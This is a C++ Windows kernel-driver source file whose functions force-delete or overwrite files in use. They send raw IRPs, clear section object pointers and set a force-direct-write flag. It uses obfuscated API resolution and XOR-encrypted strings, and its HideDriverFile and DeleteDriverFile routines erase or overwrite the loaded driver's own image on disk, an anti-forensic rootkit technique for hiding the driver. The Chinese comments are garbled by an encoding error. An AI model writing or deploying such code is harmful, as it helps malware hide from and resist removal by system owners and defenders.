#include "filer.h"
#include "../common/ntstructs.h"
#include  "../base.h"
#include "../kli.hpp"

#pragma code_seg(".vm")

NTSTATUS FD_SetFileCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	Irp->UserIosb->Status = Irp->IoStatus.Status;
	Irp->UserIosb->Information = Irp->IoStatus.Information;

	KLI_FN(KeSetEvent)(Irp->UserEvent, IO_NO_INCREMENT, FALSE);

	KLI_FN(IoFreeIrp)(Irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

HANDLE FD_OpenFile(WCHAR szFileName[])
{
	NTSTATUS            ntStatus;
	UNICODE_STRING      FileName;
	OBJECT_ATTRIBUTES   objectAttributes;
	HANDLE              hFile;
	IO_STATUS_BLOCK     ioStatus;

	// 确锟斤拷IRQL锟斤拷PASSIVE_LEVEL锟斤拷 
	if (KLI_FN(KeGetCurrentIrql)() > PASSIVE_LEVEL)
		return NULL;

	// 锟斤拷始锟斤拷锟侥硷拷锟斤拷 
	KLI_FN(RtlInitUnicodeString)(&FileName, szFileName);

	//锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 
	InitializeObjectAttributes(&objectAttributes, &FileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	// 锟斤拷锟侥硷拷 
	ntStatus = KLI_FN(IoCreateFile)(&hFile, FILE_READ_ATTRIBUTES, &objectAttributes, &ioStatus,
		0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, 0, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
	if (!NT_SUCCESS(ntStatus))
		return NULL;

	return  hFile;
}

bool FD_StripFileAttributes(HANDLE FileHandle)
{


	NTSTATUS                ntStatus = STATUS_SUCCESS;
	PFILE_OBJECT            fileObject;
	PDEVICE_OBJECT          DeviceObject;
	PIRP                    Irp;
	KEVENT                  SycEvent;
	FILE_BASIC_INFORMATION  FileInformation;
	IO_STATUS_BLOCK         ioStatus;
	PIO_STACK_LOCATION      irpSp;

	// 锟斤拷取锟侥硷拷锟斤拷锟斤拷 
	ntStatus = KLI_FN(ObReferenceObjectByHandle)(FileHandle, DELETE,
		*IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);
	if (!NT_SUCCESS(ntStatus))
	{
		LOG_DEBUG(_XOR_("ObReferenceObjectByHandle error!"));
		return FALSE;
	}

	// 锟斤拷取锟斤拷指锟斤拷锟侥硷拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷璞革拷锟斤拷锟?
	DeviceObject = KLI_FN(IoGetRelatedDeviceObject)(fileObject);

	// 锟斤拷锟斤拷IRP 
	Irp = KLI_FN(IoAllocateIrp)(DeviceObject->StackSize, TRUE);
	if (Irp == NULL)
	{
		KLI_FN(ObfDereferenceObject)(fileObject);

		LOG_DEBUG(_XOR_("FD_StripFileAttributes IoAllocateIrp error"));
		return FALSE;
	}

	// 锟斤拷始锟斤拷同锟斤拷锟铰硷拷锟斤拷锟斤拷 
	KLI_FN(KeInitializeEvent)(&SycEvent, SynchronizationEvent, FALSE);

	memset(&FileInformation, 0, 0x28);
	FileInformation.FileAttributes = FILE_ATTRIBUTE_NORMAL;

	// 锟斤拷始锟斤拷IRP 
	Irp->AssociatedIrp.SystemBuffer = &FileInformation;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = &ioStatus;
	Irp->Tail.Overlay.OriginalFileObject = fileObject;
	Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	// 锟斤拷锟斤拷IRP锟斤拷栈锟斤拷息 
	irpSp = IoGetNextIrpStackLocation(Irp);
	irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpSp->DeviceObject = DeviceObject;
	irpSp->FileObject = fileObject;
	irpSp->Parameters.SetFile.Length = sizeof(FILE_BASIC_INFORMATION);
	irpSp->Parameters.SetFile.FileInformationClass = FileBasicInformation;
	irpSp->Parameters.SetFile.FileObject = fileObject;

	// 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟?
	IoSetCompletionRoutine(Irp, FD_SetFileCompletion, NULL, TRUE, TRUE, TRUE);

	// 锟缴凤拷IRP 
	IoCallDriver(DeviceObject, Irp);

	// 锟饺达拷IRP锟斤拷锟斤拷锟?
	KLI_FN(KeWaitForSingleObject)(&SycEvent, Executive, KernelMode, TRUE, NULL);

	// 锟捷硷拷锟斤拷锟矫硷拷锟斤拷 
	KLI_FN(ObfDereferenceObject)(fileObject);

	return TRUE;


}

bool FD_DeleteFile(HANDLE FileHandle)
{


	NTSTATUS          ntStatus = STATUS_SUCCESS;
	PFILE_OBJECT      fileObject;
	PDEVICE_OBJECT    DeviceObject;
	PIRP              Irp;
	KEVENT            SycEvent;
	FILE_DISPOSITION_INFORMATION    FileInformation;
	IO_STATUS_BLOCK                 ioStatus;
	PIO_STACK_LOCATION              irpSp;
	PSECTION_OBJECT_POINTERS        pSectionObjectPointer;

	// 锟斤拷取锟侥硷拷锟斤拷锟斤拷 
	ntStatus = KLI_FN(ObReferenceObjectByHandle)(FileHandle, DELETE,
		*IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);
	if (!NT_SUCCESS(ntStatus))
	{
		LOG_DEBUG(_XOR_("ObReferenceObjectByHandle error!"));
		return FALSE;
	}

	// 锟斤拷取锟斤拷指锟斤拷锟侥硷拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷璞革拷锟斤拷锟?
	DeviceObject = KLI_FN(IoGetRelatedDeviceObject)(fileObject);

	// 锟斤拷锟斤拷IRP 
	Irp = KLI_FN(IoAllocateIrp)(DeviceObject->StackSize, TRUE);
	if (Irp == NULL)
	{
		KLI_FN(ObfDereferenceObject)(fileObject);
		LOG_DEBUG(_XOR_("FD_DeleteFile IoAllocateIrp error"));
		return FALSE;
	}

	// 锟斤拷始锟斤拷同锟斤拷锟铰硷拷锟斤拷锟斤拷 
	KLI_FN(KeInitializeEvent)(&SycEvent, SynchronizationEvent, FALSE);

	FileInformation.DeleteFile = TRUE;

	// 锟斤拷始锟斤拷IRP 
	Irp->AssociatedIrp.SystemBuffer = &FileInformation;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = &ioStatus;
	Irp->Tail.Overlay.OriginalFileObject = fileObject;
	Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	// 锟斤拷锟斤拷IRP锟斤拷栈 
	irpSp = IoGetNextIrpStackLocation(Irp);
	irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpSp->DeviceObject = DeviceObject;
	irpSp->FileObject = fileObject;
	irpSp->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
	irpSp->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
	irpSp->Parameters.SetFile.FileObject = fileObject;

	// 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟?
	IoSetCompletionRoutine(Irp, FD_SetFileCompletion, NULL, TRUE, TRUE, TRUE);

	// 锟斤拷锟矫伙拷锟斤拷锟?锟叫ｏ拷锟斤拷锟睫凤拷删锟斤拷锟斤拷锟斤拷锟斤拷锟叫碉拷锟侥硷拷 
	pSectionObjectPointer = fileObject->SectionObjectPointer;
	pSectionObjectPointer->ImageSectionObject = 0;
	pSectionObjectPointer->DataSectionObject = 0;

	// 锟缴凤拷IRP 
	IoCallDriver(DeviceObject, Irp);

	// 锟饺达拷IRP锟斤拷锟?
	KLI_FN(KeWaitForSingleObject)(&SycEvent, Executive, KernelMode, TRUE, NULL);

	// 锟捷硷拷锟斤拷锟矫硷拷锟斤拷 
	KLI_FN(ObfDereferenceObject)(fileObject);

	return TRUE;

}

bool FD_ForceDeleteFile(WCHAR szFileName[])
{

	HANDLE      hFile = NULL;
	bool     status = FALSE;

	__try {
		// 锟斤拷锟侥硷拷 
		if ((hFile = FD_OpenFile(szFileName)) == NULL)
		{
			LOG_DEBUG(_XOR_("FD_OpenFile error!"));
			return FALSE;
		}

		// //去锟斤拷只锟斤拷锟斤拷锟皆ｏ拷锟斤拷锟斤拷删锟斤拷只锟斤拷锟侥硷拷 
		if (FD_StripFileAttributes(hFile) == FALSE)
		{
			KLI_FN(ZwClose)(hFile);
			LOG_DEBUG(_XOR_("FD_StripFileAttributes error!"));
			return FALSE;
		}

		// 删锟斤拷锟侥硷拷 
		status = FD_DeleteFile(hFile);
		KLI_FN(ZwClose)(hFile);

		return status;

	}
	__except (1) {
		LOG_DEBUG(_XOR_("execption!"));
	}

	return FALSE;

}

NTSTATUS FD_WriteFile(HANDLE FileHandle, PVOID Buffer, ULONG BytesToWrite)
{

	NTSTATUS                    status;
	PIRP                        Irp;
	PFILE_OBJECT                FileObject;
	KEVENT                      SycEvent;
	IO_STATUS_BLOCK             IoStatusBlock;
	PIO_STACK_LOCATION          IoStack;
	PDEVICE_OBJECT              DeviceObject;
	PSECTION_OBJECT_POINTERS    SectionObjectPointer;
	PVOID                       SavedImageSectionObject;
	PVOID                       SavedDataSectionObject;

	// 锟斤拷取锟侥硷拷锟斤拷锟斤拷 
	status = KLI_FN(ObReferenceObjectByHandle)(FileHandle, DELETE,
		*IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
	if (!NT_SUCCESS(status)) {
		return status;
	}


	// 锟斤拷取锟斤拷指锟斤拷锟侥硷拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷璞革拷锟斤拷锟?
	DeviceObject = KLI_FN(IoGetRelatedDeviceObject)(FileObject);

	// 锟斤拷锟斤拷IRP 
	Irp = KLI_FN(IoAllocateIrp)(DeviceObject->StackSize, TRUE);
	if (Irp == NULL) {
		KLI_FN(ObfDereferenceObject)(FileObject);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	// 锟斤拷始锟斤拷同锟斤拷锟铰硷拷锟斤拷锟斤拷 
	KLI_FN(KeInitializeEvent)(&SycEvent, SynchronizationEvent, FALSE);

	PMDL mdl = KLI_FN(IoAllocateMdl)(Buffer, BytesToWrite, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		KLI_FN(IoFreeIrp)(Irp);
		KLI_FN(ObfDereferenceObject)(FileObject);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	KLI_FN(MmBuildMdlForNonPagedPool)(mdl);

	// 锟斤拷锟斤拷IRP
	Irp->MdlAddress = mdl;
	Irp->UserEvent = &SycEvent;
	Irp->UserIosb = &IoStatusBlock;
	//Irp->Flags = IRP_WRITE_OPERATION;
	Irp->Flags = SL_FORCE_DIRECT_WRITE; //锟斤拷锟斤拷强写
	Irp->RequestorMode = KernelMode;
	Irp->Tail.Overlay.Thread = PsGetCurrentThread();
	Irp->Tail.Overlay.OriginalFileObject = FileObject;

	// 锟斤拷取锟斤拷一锟斤拷IRP锟斤拷IO_STACK_LOCATION锟斤拷锟斤拷锟斤拷
	IoStack = IoGetNextIrpStackLocation(Irp);
	IoStack->MajorFunction = IRP_MJ_WRITE;
	IoStack->MinorFunction = IRP_MN_NORMAL;
	IoStack->DeviceObject = DeviceObject;
	IoStack->FileObject = FileObject;
	IoStack->Parameters.Write.Length = BytesToWrite;
	IoStack->Parameters.Write.ByteOffset = { 0 };

	// 锟斤拷锟斤拷锟斤拷锟绞碉拷锟? 锟皆憋拷通知IRP锟斤拷锟斤拷锟斤拷锟? 锟酵凤拷锟斤拷源
	IoSetCompletionRoutine(Irp, FD_SetFileCompletion, NULL, TRUE, TRUE, TRUE);

	// 锟斤拷锟矫伙拷校锟斤拷锟斤拷薹锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷械锟斤拷募锟?
	SectionObjectPointer = FileObject->SectionObjectPointer;
	// 锟斤拷锟斤拷一锟斤拷
	SavedImageSectionObject = SectionObjectPointer->ImageSectionObject;
	SavedDataSectionObject = SectionObjectPointer->DataSectionObject;



	SectionObjectPointer->ImageSectionObject = 0;
	SectionObjectPointer->DataSectionObject = 0;

	//锟斤拷锟斤拷一锟斤拷锟侥硷拷锟斤拷小
	NT::FILE_ALLOCATION_INFORMATION FileAllocInfo;
	FileAllocInfo.AllocationSize.QuadPart = 0;
	KLI_FN(ZwSetInformationFile)(FileHandle, &IoStatusBlock, &FileAllocInfo, sizeof(NT::FILE_ALLOCATION_INFORMATION), FileAllocationInformation);

	// 锟街革拷状态
	SectionObjectPointer->ImageSectionObject = SavedImageSectionObject;
	SectionObjectPointer->DataSectionObject = SavedDataSectionObject;


	__CONTROL_AREA* ImageSectionObject = (__CONTROL_AREA*)SavedImageSectionObject;
	__CONTROL_AREA* DataSectionObject = (__CONTROL_AREA*)SavedDataSectionObject;
	ImageSectionObject->Segment->SegmentFlags.NoCache = 1;
	DataSectionObject->Segment->SegmentFlags.NoCache = 1;

	// 锟缴凤拷IRP 
	status = IoCallDriver(DeviceObject, Irp);   //STATUS_PENDING
	if (!NT_SUCCESS(status)) {
		KLI_FN(IoFreeMdl)(mdl);
		KLI_FN(ObfDereferenceObject)(FileObject);
		return status;
	}
	// 锟饺达拷IRP锟斤拷锟斤拷锟?
	status = KLI_FN(KeWaitForSingleObject)(&SycEvent, Executive, KernelMode, TRUE, NULL);

	KLI_FN(IoFreeMdl)(mdl);
	KLI_FN(ObfDereferenceObject)(FileObject);
	return status;

}

VOID HideDriverFile(PDRIVER_OBJECT pDriver, PUCHAR data, size_t size)
{

	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	wchar_t str[256] = { 0 };
	wcsncpy(str, ldr->FullDllName.Buffer, ldr->FullDllName.Length / 2);
	str[ldr->FullDllName.Length / 2] = 0;


	HANDLE hFile = FD_OpenFile(str);

	// //去锟斤拷只锟斤拷锟斤拷锟皆ｏ拷锟斤拷锟斤拷删锟斤拷只锟斤拷锟侥硷拷 
	if (FD_StripFileAttributes(hFile) == FALSE)
	{
		KLI_FN(ZwClose)(hFile);
		LOG_DEBUG(_XOR_("FD_StripFileAttributes error!"));
		return;
	}

	FD_WriteFile(hFile, data, size);

	KLI_FN(ZwClose)(hFile);


}

VOID DeleteDriverFile(PDRIVER_OBJECT pDriver)
{

	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	wchar_t str[256] = { 0 };
	wcsncpy(str, ldr->FullDllName.Buffer, ldr->FullDllName.Length / 2);
	str[ldr->FullDllName.Length / 2] = 0;

	FD_ForceDeleteFile(str);

}

#pragma code_seg()